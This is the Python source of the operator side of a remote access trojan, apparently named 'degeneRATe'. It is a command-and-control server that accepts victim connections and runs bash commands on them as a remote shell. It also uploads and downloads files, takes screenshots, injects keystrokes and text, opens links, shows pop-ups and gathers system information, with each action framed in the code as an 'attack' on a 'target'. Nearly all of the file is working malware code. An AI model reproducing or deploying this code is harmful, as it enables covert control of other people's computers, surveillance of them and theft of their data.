from socket import socket
from sql import insert_request, insert_commands, find_commands, delete_commands
from struct import pack, unpack
from pickle import loads, dumps, UnpicklingError
from threading import Thread
from os import stat
# Need to install :
from beautifultable import BeautifulTable
from cryptography.fernet import Fernet
from loguru import logger
from colorama import Fore, init

# Change to 127.0.0.1 if localhost
IP = "0.0.0.0"
PORT = 4347
# Change to
# echo -e "from cryptography.fernet import Fernet\nprint(Fernet.generate_key())" | python
FERNET_KEY = "4DSZ05ER5frErX-_xZnSeU4Dv7oKiRThq92x8UclRPs="
logger.remove()
logger.add("degeneRATe.log", format="{level} | {time} | {file}:{function}:{line} - {message}")
init(autoreset=True)


class Shell:
    def __init__(self, conns: list, sock: socket()):
        self.conns = conns
        self.sock = sock
        # Change this key to your own (Fernet.generate_key()) in the client and server
        self.f = Fernet(FERNET_KEY)
        self.client = None
        self.client_ip = None
        self.shell = False
        self.conn = None
        self.stop = False
        self.file_id = 0
        self.conns_table = BeautifulTable()
        self.commands_table = BeautifulTable()
        self.help_table = BeautifulTable()
        # All commands
        self.commands = {
            "help": {"func": self.help, "description": "Print information about all commands."},
            "conns": {"func": self.connections, "description": "Print all connections."},
            "use": {"func": self.use, "description": "Select connection from the list of connections."},
            "upload": {"func": self.upload, "description": "Upload local file."},
            "download": {"func": self.download, "description": "Download remote file."},
            "open_link": {"func": self.open_link, "description": "Opening a link on the selected connection."},
            "hot_key": {"func": self.press_hot_key, "description": "Pressing hotkeys on the selected connection."},
            "write_text": {"func": self.write_text, "description": "Enter text on the selected connection."},
            "window_alert": {"func": self.window_alert, "description": "Creating a window on the selected connection."},
            "screenshot": {"func": self.screenshot, "description": "Creating a screenshot for the selected connection"},
            "pc_info": {"func": self.pc_info, "description": "Information about the computer."},
            "ins_command": {"func": self.insert_command, "description": "Adding commands to the DB."},
            "commands": {"func": self.print_commands, "description": "Output of commands from the DB."},
            "del_command": {"func": self.delete_command, "description": "Deleting commands from the DB."},
            "exit": {"func": self.close_all_connections, "description": "Close program."}
        }

    def input_command(self) -> None:
        while not self.stop:
            try:
                if self.conn:
                    inp = input(f"[degeneRATe@{self.conn[1][0]}]$ ")
                else:
                    inp = input("$ ")
                command = inp.split(" ")[0]
                args = inp.split(" ")[1:]
                if command in self.commands:
                    if "-h" in args or "--help" in args:
                        print(self.commands[command]["description"])
                    else:
                        output = self.commands[command]["func"]()
                        if output is not None:
                            print(output)
                elif self.shell is True:
                    print(self.start_attack(list_commands=[("bash", inp)]))
            except Exception as e:
                try:
                    print(f"{Fore.RED}{e.__class__}: {e} | {e.args}")
                except:
                    pass

    def recv_and_decrypt(self) -> bytes:
        """
            Receiving and decrypting commands from the client
            :return: command
        """
        if not self.client and self.conn:
            self.client = self.conn[0]
        if self.client:
            length = self.client.recv(4)
            len_data = unpack("i", length)[0]
            answer = self.client.recv(len_data)
            if answer == b"":
                return
            answer = self.f.decrypt(answer)
            return answer

    def send(self, send_data: bytes) -> None:
        """
            Encryption and sending commands to the client
            :param send_data: commands
        """
        if not self.client and self.conn:
            self.client = self.conn[0]
        if self.client:
            crypto_data = self.f.encrypt(send_data)
            len_data = pack("i", len(crypto_data))
            self.client.send(len_data)
            self.client.send(crypto_data)

    def help(self) -> BeautifulTable:
        """
            Output information about all commands
            :return: A table with commands
        """
        self.help_table = BeautifulTable()
        self.help_table.columns.header = ["NAME", "DESCRIPTION"]
        for command in self.commands:
            self.help_table.rows.append([command, self.commands[command]["description"]])
        return self.help_table

    def connections(self) -> BeautifulTable | str:
        """
            Printing of connected connections
            :return: A table with connections or "Connections not found!"
        """
        if len(self.conns) > 0:
            id_conn = 0
            self.conns_table = BeautifulTable()
            self.conns_table.columns.header = ["ID", "IP", "PORT"]
            for conn in self.conns:
                try:
                    self.client = conn[0]
                    self.send(b"online?")
                    answer = self.recv_and_decrypt()
                except BrokenPipeError:
                    self.conn = conn
                    print(self.disconnect())
                    continue
                if answer == b"yes":
                    self.conns_table.rows.append([id_conn, f"{Fore.GREEN} {conn[1][0]}", f"{Fore.GREEN} {conn[1][1]}"])
                    id_conn += 1
            return self.conns_table
        else:
            return f"{Fore.YELLOW}Connections not found!"

    def use(self) -> None | str:
        """
            Connection selection
        """
        id_conn = input("Enter ID: ")
        shell_or_commands = input('Enter "Shell" or "Commands" (from DB) : ')
        if id_conn.isdigit() and int(id_conn) < len(self.conns):
            self.conn = self.conns[int(id_conn)]
            self.client = self.conn[0]
            self.client_ip = self.conns[int(id_conn)][1][0]
        else:
            return f"{Fore.YELLOW}ID not found!"

        if shell_or_commands.lower() == "connection":
            pass
        elif shell_or_commands.lower() == "shell" or shell_or_commands.lower() == "y":
            self.shell = True
        else:
            return self.start_attack()

    def start_attack(self, list_commands: list = None) -> str:
        """
            Attacks a target that is stored in self.conn.
            If the information that is transmitted when receiving a response from the client is more than 1024 bytes,
            then the response is saved and added to the next response of the client and so on in a circle.
        """
        try:
            if self.conn is None:
                return f"{Fore.RED}self.conn is None\n{Fore.RESET}Use the command 'use'"
            self.client, addr = self.conn
            self.send(b"start_attack")
            if list_commands is None:
                json_commands = self.get_command()
            else:
                json_commands = self.get_command(commands=list_commands)
            logger.info(json_commands)
            info = f"IP: {addr[0]} Event: Get Command | Commands: {json_commands}"
            commands = dumps(json_commands)
            self.send(commands)
            data = None
            count = len(json_commands["commands"])
            if count == 0:
                return f"{Fore.YELLOW}Commands not found!"
            while count > 0:
                if data is None:
                    data = self.recv_and_decrypt()
                else:
                    data += self.recv_and_decrypt()
                if data == b"":
                    return
                try:
                    info += f'\n{self.get_result(loads(data))}'
                    data = None
                    count -= 1
                except UnpicklingError:
                    pass
            return info
        except BrokenPipeError:
            return self.disconnect()

    def upload(self) -> None:
        """
            Downloading a file to the client
        """
        remote_filepath = input("input remote filepath: ")
        local_filename = input("input local filename: ")
        try:
            file_size = stat(local_filename).st_size
        except FileNotFoundError | FileExistsError as e:
            return e
        self.send(b"upload")
        self.send(dumps(remote_filepath))
        self.send(dumps(str(file_size)))
        with open(local_filename, "rb") as file:
            file_data = file.read(1024)
            while file_data:
                self.client.send(file_data)
                file_data = file.read(1024)

    def download(self, local_filepath: str = None) -> None:
        """
            Downloading the file on the server
            :param local_filepath: The name of the file to download to the server
        """
        if local_filepath is None:
            local_filepath = input("input local filepath: ")
            remote_filepath = input("input remote filename: ")
            self.send(b"download")
            self.send(dumps(remote_filepath))
        file_size = loads(self.recv_and_decrypt())
        if file_size.isdigit():
            file_size = int(file_size)
        else:
            return file_size
        transfer_size = 0
        with open(local_filepath, "wb") as file:
            recv_data = self.client.recv(1024)
            transfer_size += len(recv_data)
            while recv_data:
                file.write(recv_data)
                if transfer_size < file_size:
                    recv_data = self.client.recv(1024)
                    transfer_size += len(recv_data)
                else:
                    recv_data = None

    def open_link(self):
        link = input("Enter link: ")
        if len(link.split("http")) >= 2 and self.client is not None:
            self.send(b"open_link")
            self.send(dumps(link))
        elif not self.client:
            return f"{Fore.RED}Error: self.client not found"
        else:
            return f"{Fore.RED}Error: link not have 'http'"

    def press_hot_key(self):
        hot_keys = input("https://pyautogui.readthedocs.io/en/latest/keyboard.html#keyboard-keys\n"
                         "Enter the buttons separated by a space: ")
        self.send(b"press_hot_key")
        self.send(dumps(hot_keys.split(" ")))

    def write_text(self):
        text = input("Enter text: ")
        self.send(b"write_text")
        self.send(dumps(text))

    def window_alert(self):
        title = input("Enter title: ")
        text = input("Enter text: ")
        self.send(b"window_alert")
        self.send(dumps(title))
        self.send(dumps(text))

    def pc_info(self):
        self.send(b"pc_info")
        json_pc_info = loads(self.recv_and_decrypt())
        pc_info = f"""Name pc: {json_pc_info["name_pc"]}
Processor:
    All cpu count: {json_pc_info["all_cpu_count"]} 
    Processor frequency: {json_pc_info["cpu_freq_current"]} Mhz
RAM:
    All RAM: {json_pc_info["all_ram"]}
    Free: {json_pc_info["ram_free"]}
    Used: {json_pc_info["ram_used"]}
                   """

        for disk in json_pc_info['disk_partitions']:
            name_disk = f"\nName disk: {disk['name']}"
            size_disk = f"\nDisk size: {disk['size']}\n"
            pc_info += name_disk + size_disk
        return pc_info

    def screenshot(self):
        if self.client is None:
            return f"{Fore.RED}Error: self.client is None"
        self.send(b"make_screenshot")
        self.download(local_filepath=f"screenshot_{self.file_id}.jpg")
        self.file_id += 1

    @staticmethod
    def insert_command() -> str:
        """
            Adding a command to the db
        """
        type_command = input("insert type command ( Work only bash ): ")
        command = input("insert command: ")
        question = input("Are you sure?[Y/n] ")
        if question.upper() == "Y":
            insert_commands([(type_command, command)])
            return f"{Fore.GREEN} The command was successfully added"
        else:
            return "OK"

    def print_commands(self) -> BeautifulTable | str:
        commands = find_commands()
        if len(commands) == 0:
            return f"{Fore.YELLOW}Commands not found!"
        self.commands_table = BeautifulTable()
        self.commands_table.columns.header = ["TYPE", "COMMAND"]
        for command in commands:
            self.commands_table.rows.append([command[0], command[1]])
        return self.commands_table

    @staticmethod
    def delete_command():
        """
            Deleting a command from the db
        """
        command = input("Enter command: ")
        delete_commands(command)

    @staticmethod
    def logo():
        print(f"""
    {Fore.GREEN}  ╭╮              ╭━━━┳━━━┳━━━━╮
      ┃┃              ┃╭━╮┃╭━╮┃╭╮╭╮┃
    {Fore.CYAN}╭━╯┣━━┳━━┳━━┳━╮╭━━┫╰━╯┃┃ ┃┣╯┃┃┣┻━╮
    ┃╭╮┃┃━┫╭╮┃┃━┫╭╮┫┃━┫╭╮╭┫╰━╯┃ ┃┃┃┃━┫
    ┃╰╯┃┃━┫╰╯┃┃━┫┃┃┃┃━┫┃┃╰┫╭━╮┃ ┃┃┃┃━┫
    ╰━━┻━━┻━╮┣━━┻╯╰┻━━┻╯╰━┻╯ ╰╯ ╰╯╰━━╯
    {Fore.LIGHTRED_EX}      ╭━╯┃        {Fore.GREEN}by Gadzhi07
    {Fore.RED}      ╰━━╯        {Fore.YELLOW}https://github.com/Gadzhi07/degeneRATe""")

    def close_all_connections(self) -> None:
        """
            Closing the program
        """
        for conn in self.conns:
            try:
                self.client = conn[0]
                self.send(b"exit")
            except BrokenPipeError:
                pass
            self.client.close()
            self.conns.remove(conn)
        self.sock.close()
        self.stop = True
        exit("Press Ctrl+C")

    def get_command(self, commands: list = None) -> dict:
        """
                :param commands - list [(type, command), (type, command)]
         """
        logger.info(commands)
        json_commands = {"commands": []}
        if commands is None:
            commands = find_commands()
        if not commands:
            return json_commands
        if commands:
            for command in commands:
                json_commands["commands"].append({"type": command[0], "command": command[1]})
        else:
            json_commands = None
        logger.info(f"IP: {self.client_ip} Event: Get Command | Commands: {Fore.GREEN}{json_commands}")
        return json_commands

    def get_result(self, result: dict) -> str:
        """
            Working with the results of the attack
            :param result: The result of the attack
        """
        result_str = result['result'].replace('~/~', '\n')
        insert_request([(self.client_ip, result["command"], result_str)])
        logger.info(f" IP: {self.client_ip} Event: Get Result | Result: {result['result']}")
        return f"IP: {self.client_ip} Event: Get Result | Result: \n{Fore.GREEN}{result_str}"

    def disconnect(self) -> str:
        """
            Deleting a disconnected connection
        """
        ip = self.conn[1][0]
        self.conns.remove(self.conn)
        self.client = None
        self.client_ip = None
        self.shell = False
        self.conn = None
        logger.info(f"IP: {ip} Event: Disconnect")
        return f"{Fore.YELLOW}IP: {ip} Event: Disconnect"


# waiting for the client to connect and writing the client to the connection list
def accept():
    try:
        while True:
            client = sock.accept()
            conns.append(client)
    except OSError as err:
        if err.errno == 9:
            exit()


def shell():
    try:
        Shell(conns, sock).input_command()
    finally:
        Shell(conns, sock).close_all_connections()


def main():
    try:
        t1 = Thread(target=shell, name='shell')
        t1.start()
        t2 = Thread(target=accept, name='accept')
        t2.start()
        t1.join()
    finally:
        Shell(conns, sock).close_all_connections()


if __name__ == "__main__":
    conns = []
    sock = socket()
    try:
        sock.bind((IP, PORT))
        sock.listen(10000)
    except OSError as e:
        if e.errno == 98:
            exit("Repeat again after 60 seconds or kill the previous process.")
    Shell.logo()
    main()
